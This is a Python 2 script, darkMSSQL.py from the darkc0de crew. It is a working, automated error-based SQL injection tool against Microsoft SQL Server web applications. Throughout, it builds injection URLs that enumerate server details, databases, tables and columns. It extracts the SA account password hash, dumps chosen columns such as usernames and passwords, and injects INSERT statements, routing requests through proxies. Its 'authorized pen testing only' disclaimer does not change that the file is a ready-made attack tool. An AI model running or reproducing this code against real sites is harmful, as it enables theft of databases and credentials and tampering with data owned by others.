#!/usr/bin/python
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################ 

# Share the c0de!

# darkc0de Crew 
# www.darkc0de.com 
# rsauron[at]gmail[dot]com

# Greetz to 
# d3hydr8, Tarsian, rechemen, c0mrade (r.i.p brotha), reverenddigitalx
# and the darkc0de crew

# Thanks to inkubus for helping me beta

# NOTES: 
# Proxy function may be a little buggy if your using public proxies... Test your proxy prior to using it with this script..
# The script does do a little proxy test.. it does a GET to google.com if data comes back its good... no data = failed and the proxy 
# will not be used. This is a effort to keep the script from getting stuck in a endless loop.
# Any other questions Hit the forums and ask questions. google is your friend!

# This was written for educational purpose only. Use it at your own risk.
# Author will be not responsible for any damage caused! User assumes all responsibility 
# Intended for authorized Web Application Pen Testing Only!

# BE WARNED, THIS TOOL IS VERY LOUD..

import sys, re, os, socket, urllib2, time, random, cookielib, string

#determine platform
if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
	SysCls = 'clear'
elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
	SysCls = 'cls'
else:
	SysCls = 'unknown'

#say hello
os.system(SysCls)
if len(sys.argv) <= 1:
        print "\n|------------------------------------------------|"
        print "| rsauron[@]gmail[dot]com                   v2.0 |"
        print "|   10/2008      darkMSSQL.py                    |"
        print "|      -MSSQL Error Based Database Enumeration   |"
        print "|      -MSSQL Server Information Enumeration     |"
        print "|      -MSSQL Data Extractor                     |"
        print "| Usage: darkMSSQL.py [options]                  |"
        print "|  [Public Beta]      -h help       darkc0de.com |"
        print "|------------------------------------------------|\n"
        sys.exit(1)
			

#help option
for arg in sys.argv:
        if arg == "-h":
                print "   Usage: ./darkMSSQL.py [options]                       rsauron[@]gmail[dot]com darkc0de.com"
                print "\tModes:"
                print "\tDefine: --info    Gets MySQL server configuration only."
                print "\tDefine: --dbs     Shows all databases user has access too."
                print "\tDefine: --schema  Enumerate Information_schema Database."
                print "\tDefine: --dump    Extract information from a Database, Table and Column."
                print "\tDefine: --insert  Insert data into specified db, table and column(s)."
                print "\n\tRequired:"
                print "\tDefine: -u        URL \"www.site.com/news.asp?id=2\" or \"www.site.com/index.asp?id=news'\""
                print "\n\tMode dump and schema options:"
                print "\tDefine: -D        \"database_name\""
                print "\tDefine: -T        \"table_name\""
                print "\tDefine: -C        \"column_name,column_name...\""
                print "\n\tOptional:"
                print "\tDefine: -p        \"127.0.0.1:80 or proxy.txt\""
                print "\tDefine: -o        \"ouput_file_name.txt\"        Default is darkMSSQLlog.txt"
                print "\tDefine: -r        \"-r 20\" this will make the script resume at row 20 during dumping"
                print "\tDefine: --cookie  \"cookie_file.txt\""
                print "\tDefine: --debug   Prints debug info to terminal."   
                print "\n   Ex: ./darkMSSQL.py --info -u \"www.site.com/news.asp?id=2\""
                print "   Ex: ./darkMSSQL.py --dbs -u \"www.site.com/news.asp?id=2\""
                print "   Ex: ./darkMSSQL.py --schema -u \"www.site.com/news.asp?id=2\" -D dbname"
                print "   Ex: ./darkMSSQL.py --dump -u \"www.site.com/news.asp?id=2\" -D dbname -T tablename -C username,password"
                print "   Ex: ./darkMSSQL.py -u \"www.site.com/news.asp?news=article'\" -D dbname -T table -C user,pass --insert -D dbname -T table -C darkuser,darkpass"
                print
                sys.exit(1) 

#define varablies
site = ""
dbt = "darkMSSQLlog.txt"
proxy = "None"
count = 0
basicinfo = ["@@VERSION","USER","DB_NAME()","HOST_NAME()",]#@@SERVERNAME] *SEVERNAME causes errors on some 2000 servers
db_num = 0
top_num = 0
arg_table = "None"
arg_database = "None"
arg_columns = "None"
arg_insert = "None"
arg_debug = "off"
arg_cookie = "None"
col_url = ""
insert_url = ""
selected_col = ""
inserted_data = ""
mode = "None"
gets = 0
row_num = 0

#Check args
for arg in sys.argv:
	if arg == "-u":
		site = sys.argv[count+1]
	elif arg == "-o":
		dbt = sys.argv[count+1]
	elif arg == "-p":
		proxy = sys.argv[count+1]
        elif arg == "--info":
                mode = arg
                arg_info = sys.argv[count]
        elif arg == "--dbs":
                mode = arg
                arg_dbs = sys.argv[count]
        elif arg == "--schema":
                mode = arg
                arg_schema = sys.argv[count]
	elif arg == "--dump":
                mode = arg
                arg_dump = sys.argv[count]
	elif arg == "-D":
		arg_database = sys.argv[count+1]
	elif arg == "-T":
		arg_table = sys.argv[count+1]
	elif arg == "-C":
		arg_columns = sys.argv[count+1]
	elif arg == "--debug":
                arg_debug = "on"
        elif arg == "--cookie":
                arg_cookie = sys.argv[count+1]
	elif arg == "--insert":
                mode = arg
		arg_insert = sys.argv[count+1]
	elif arg == "-r":
                row_num = sys.argv[count+1]
                top_num = sys.argv[count+1]
	count+=1

#Title write
file = open(dbt, "a")
print "\n|------------------------------------------------|"
print "| rsauron[@]gmail[dot]com                   v2.0 |"
print "|   10/2008      darkMSSQL.py                    |"
print "|      -MSSQL Error Based Database Enumeration   |"
print "|      -MSSQL Server Information Enumeration     |"
print "|      -MSSQL Data Extractor                     |"
print "| Usage: darkMSSQL.py [options]                  |"
print "|  [Public Beta]      -h help       darkc0de.com |"
print "|------------------------------------------------|"
file.write("\n|------------------------------------------------|")
file.write("\n| rsauron[@]gmail[dot]com                   v2.0 |")
file.write("\n|   10/2008      darkMSSQL.py                    |")
file.write("\n|      -MSSQL Error Based Database Enumeration   |")
file.write("\n|      -MSSQL Server Information Enumeration     |")
file.write("\n|      -MSSQL Data Extractor                     |")
file.write("\n| Usage: darkMSSQL.py [options]                  |")
file.write("\n|  [Public Beta]      -h help       darkc0de.com |")
file.write("\n|------------------------------------------------|")

#Arg Error Checking
if site == "":
        print "\n[-] Must include -u flag and specify a mode."
        print "[-] For help -h\n"
        sys.exit(1)
if mode == "None":
        print "\n[-] Mode must be specified --info, --dbs, --schema, --dump, --insert"
        print "[-] For help -h\n"
        sys.exit(1)
if mode == "--schema" and arg_database == "None":
        print "\n[-] Must include -D flag!"
        print "[-] For Help -h\n"
        sys.exit(1)
if mode == "--dump":
        if arg_table == "None" or arg_columns == "None":
                print "\n[-] You must include -D, -T and -C flag when --dump specified!"
                print "[-] For help -h\n"
                sys.exit(1)
if proxy != "None":
        if len(proxy.split(".")) == 2:
                proxy = open(proxy, "r").read()
        if proxy.endswith("\n"):
                proxy = proxy.rstrip("\n")
        proxy = proxy.split("\n")
if site[:4] != "http": 
	site = "http://"+site
if site.endswith("/*"):
	site = site.rstrip('/*')
if site.endswith("--"):
	site = site.rstrip('--')
if arg_cookie != "None":
        try:
                cj = cookielib.MozillaCookieJar()
                cj.load(arg_cookie)
                cookie_handler = urllib2.HTTPCookieProcessor(cj)
        except:
                print "[!] There was a problem loading your cookie file!"
                print "[!] Make sure the cookie file is in Mozilla Cookie File Format!"
                print "[!] http://xiix.wordpress.com/2006/03/23/mozillafirefox-cookie-format/\n"
                sys.exit(1)
else:
        cookie_handler = urllib2.HTTPCookieProcessor()
if arg_columns != "None":
        arg_columns = arg_columns.split(",")
        for column in arg_columns:
                col_url += "%2bconvert(varchar,isnull(convert(varchar,"+column+"),char(32)))%2bchar(58)"
if arg_insert != "None":
        arg_insert = arg_insert.split(",")

#General Info
print "\n[+] URL:",site
file.write("\n\n[+] URL:"+site)
print "[+] %s" % time.strftime("%X")
file.write("\n[+] %s" % time.strftime("%X"))
print "[+] Cookie:", arg_cookie
file.write("\n[+] Cookie: "+arg_cookie)

#Build proxy list
socket.setdefaulttimeout(10)
proxy_list = []
if proxy != "None":
	file.write("\n[+] Building Proxy List...")
	print "[+] Building Proxy List..."
	for p in proxy:
		try:
			proxy_handler = urllib2.ProxyHandler({'http': 'http://'+p+'/'})
			opener = urllib2.build_opener(proxy_handler)
			opener.open("http://www.google.com")
			proxy_list.append(urllib2.build_opener(proxy_handler, cookie_handler))
			file.write("\n\tProxy:"+p+"- Success")
			print "\tProxy:",p,"- Success"
		except:
			file.write("\n\tProxy:"+p+"- Failed")
			print "\tProxy:",p,"- Failed"
			pass
	if len(proxy_list) == 0:
		print "[-] All proxies have failed. App Exiting"
		sys.exit(1) 
	print "[+] Proxy List Complete"
	file.write("\n[+] Proxy List Complete")
else:
	print "[-] Proxy Not Given"
	file.write("\n[+] Proxy Not Given")
	proxy_list.append(urllib2.build_opener(cookie_handler))
proxy_num = 0
proxy_len = len(proxy_list)

#URL Get Function
def GetTheShit(head_URL):
        try:
                if arg_debug == "on":
                        print "\n[debug]",head_URL
                        file.write("\n[debug] "+head_URL)
                try:
                        source = proxy_list[proxy_num % proxy_len].open(head_URL).read()
                except urllib2.HTTPError, e:
                        source = e.read()
                match = re.findall("value '[\d\D]*' to",source)
                match = match[0][7:-4]
                return match
        except (KeyboardInterrupt, SystemExit):
                raise
        except:
                pass
                    
# Here are the modes!
if mode == "--info":
        print "[+] Displaying information about MSSQL host!\n"
        file.write("\n[+] Displaying information about MSSQL host!\n")
        site_URL = site+"+or+1=convert(int,(darkc0de))--"
        for baseinfo in basicinfo:
                gets+=1;proxy_num+=1
                head_URL = site_URL.replace("darkc0de",str(baseinfo))
                the_juice = GetTheShit(head_URL)
                if str(the_juice) == "None":
                        print "[-] We seem to be having a problem! Check it out manually!"
                        print "[-] "+str(head_URL)
                        print "\n[-] Done"
                        sys.exit(1)
                if baseinfo == "@@VERSION":
                        ver_info = the_juice
                print "[+]",baseinfo+":",the_juice
                file.write("\n[+] "+baseinfo+": "+the_juice)
        print "\n[+] Script detected Microsoft SQL Version:",ver_info[21:26]
        file.write("\n\n[+] Script detected Microsoft SQL Version: "+ver_info[21:26])
        if ver_info[25] == "0":
                gets+=1;proxy_num+=1
                head_URL = site+"+or+1=convert(int,(select+top+1+master.dbo.fn_varbintohexstr(password)+from+master..sysxlogins+where+name='sa'))--"
                the_juice = GetTheShit(head_URL)
                if str(the_juice) == "None":
                        yesno = "Nope!"
                else:
                        yesno = "Yes! w00t w00t! Time to break out sqlninja!"
        else:
                gets+=1;proxy_num+=1
                head_URL = site+"+or+1=convert(int,(select+top+1+master.sys.fn_varbintohexstr(password_hash)+from+master.sys.sql_logins+where+name='sa'))--"
                the_juice = GetTheShit(head_URL)
                if str(the_juice) == "None":
                        yesno = "Nope!"
                else:
                        yesno = "Yes! w00t w00t! Time to break out sqlninja!"
        print "[+] Checking to see if we can view password hashs...", yesno
        file.write("\n[+] Checking to see if we can view password hashs... "+yesno)
        if yesno != "Nope!":
                print "[!] Dumping SA Account info:"
                file.write("\n[!] Dumping SA Account info:")
                print "\tUsername: SA"
                file.write("\n\tUsername: SA")
                print "\tSalt:",the_juice[6:14]
                file.write("\n\tSalt: "+the_juice[6:14])
                print "\tMixedcase:",the_juice[15:54]
                file.write("\n\tMixedcase: "+the_juice[15:54])
                print "\tUppercase:",the_juice[55:]
                file.write("\n\tUppercase: "+the_juice[55:])
                print "\tFull Hash:",the_juice
                file.write("\n\tFull Hash: "+the_juice)
                
if mode == "--dbs":
        print "[+] Displaying list of all databases on MSSQL host!\n"
        file.write("\n[+] Displaying list of all databases on MSSQL host!\n")
        while 1:
                gets+=1;proxy_num+=1
                head_URL = site+"+or+1=convert(int,(DB_NAME(darkc0de)))--"
                head_URL = head_URL.replace("darkc0de",str(db_num))
                the_juice = GetTheShit(head_URL)
                if str(the_juice) == "None":
                        break
                print "["+str(row_num)+"]",the_juice
                file.write("\n["+str(row_num)+"] "+the_juice)
                db_num+=1;row_num+=1

if mode == "--schema":
        #List Tables
        if arg_database != "None" and arg_table == "None":          
                print "[+] Displaying tables inside DB: "+arg_database+"\n"
                file.write("\n[+] Displaying tables inside DB: "+arg_database+"\n")
                site_URL = site+"+or+1=convert(int,(select+top+1+table_name+from+"+arg_database+".information_schema.tables+where+table_name+NOT+IN"
                site_URL = site_URL+"+(SELECT+TOP+darkc0de+table_name+FROM+"+arg_database+".information_schema.tables+ORDER+BY+table_name)+ORDER+BY+table_name))--"
                while 1:
                        gets+=1;proxy_num+=1
                        head_URL = site_URL.replace("darkc0de",str(top_num))
                        the_juice = GetTheShit(head_URL)
                        if str(the_juice) == "None":
                                if str(row_num) == "1":
                                        print "[-] We do not seem to have premissions to view this database!"
                                        print "[-] Try again with the debug option on.. verify manually whats going on!"
                                break
                        print "["+str(row_num)+"]",the_juice
                        file.write("\n["+str(row_num)+"] "+the_juice)
                        top_num+=1;row_num+=1

        #List Columns
        if arg_table != "None":
                print "[+] Displaying Columns inside DB: "+arg_database+" and Table: "+arg_table+"\n"
                file.write("\n[+] Displaying Columns inside DB: "+arg_database+" and Table: "+arg_table+"\n")
                site_URL = site+"+or+1=convert(int,(select+top+1+column_name+from+"+arg_database+".information_schema.columns+where+table_name='"+arg_table+"'+AND+column_name+NOT+IN"
                site_URL = site_URL+"+(SELECT+TOP+darkc0de+column_name+FROM+"+arg_database+".information_schema.columns+where+table_name='"+arg_table+"'+ORDER+BY+column_name)+ORDER+BY+column_name))--"
                while 1:
                        gets+=1;proxy_num+=1
                        head_URL = site_URL.replace("darkc0de",str(top_num))
                        the_juice = GetTheShit(head_URL)
                        if str(the_juice) == "None":
                                if str(row_num) == "1":
                                        print "[-] We do not seem to have premissions to view this table!"
                                        print "[-] Try again with the debug option on.. verify manually whats going on!"
                                break
                        print "["+str(row_num)+"]",the_juice
                        file.write("\n["+str(row_num)+"] "+the_juice)
                        top_num+=1;row_num+=1
                        

if mode == "--dump":
        print "[+] Dumping data from DB: "+arg_database+", Table: "+arg_table+", Column: "+str(arg_columns)+"\n"
        site_URL = site+"+or+1=convert(int,(select+top+1+"+col_url+"+from+"+arg_database+".."+arg_table+"+where+"+arg_columns[0]
        site_URL = site_URL+"+NOT+in+(SELECT+TOP+darkc0de+"+arg_columns[0]+"+from+"+arg_database+".."+arg_table+")))--"
        while 1:
                gets+=1;proxy_num+=1
                head_URL = site_URL.replace("darkc0de",str(top_num))
                the_juice = GetTheShit(head_URL)
                if str(the_juice) == "None":
                        if row_num == 1:
                                print "[-] We seem to be having a problem!"
                                print "[-] Try again with the debug option on.. verify manually whats going on!"
                                break
                        break
                the_juice = string.rstrip(the_juice,":")
                print "["+str(row_num)+"]",the_juice
                file.write("\n["+str(row_num)+"] "+the_juice)
                top_num = int(top_num) + 1;row_num = int(row_num) + 1

if mode == "--insert":
        print "[+] Inserting data into..."
        print "\tDB: "+arg_database
        print "\tTable: "+arg_table
        print "\tColumn(s):\tData to be inserted:\n"
        try:
                for x in range(0, len(arg_columns)):
                        print "\t["+str(x)+"] "+arg_columns[x]+"\t"+arg_insert[x]
        except:
                pass
        for column in arg_columns:
                selected_col += column+","
        selected_col = selected_col.rstrip(",")
        for data in arg_insert:
                inserted_data += "'"+data+"',"
        inserted_data = inserted_data.rstrip(",")
        gets+=1;proxy_num+=1
        head_URL = site+";INSERT+INTO+"+arg_table+"("+selected_col+")+VALUES("+inserted_data+")--"
        print "\n[!] Inserting Data....",
        the_juice = GetTheShit(head_URL)
        print "Done!"
        print "\n[+] Was the data inserted?"
        gets+=1;proxy_num+=1
        head_URL = site+"+or+1=convert(int,(select+top+1+"+col_url+"+from+"+arg_database+".."+arg_table+"+where+"+arg_columns[0]+"='"+arg_insert[0]+"'))--"
        the_juice = GetTheShit(head_URL)
        if str(the_juice) == "None":
                print "\n[-] Does not look like the data was inserted!"
        else:
                the_juice = the_juice.rstrip(":")
                print "\t"+the_juice
                print "[!] Data was successfully inserted!"
                
# Closing Info               
print "\n[-] %s" % time.strftime("%X")
print "[-] Total URL Requests",gets
file.write("\n\n[-] [%s]" % time.strftime("%X"))
file.write("\n[-] Total URL Requests "+str(gets))
print "[-] Done\n"
file.write("\n[-] Done\n")
print "Don't forget to check", dbt,"\n"
file.close()
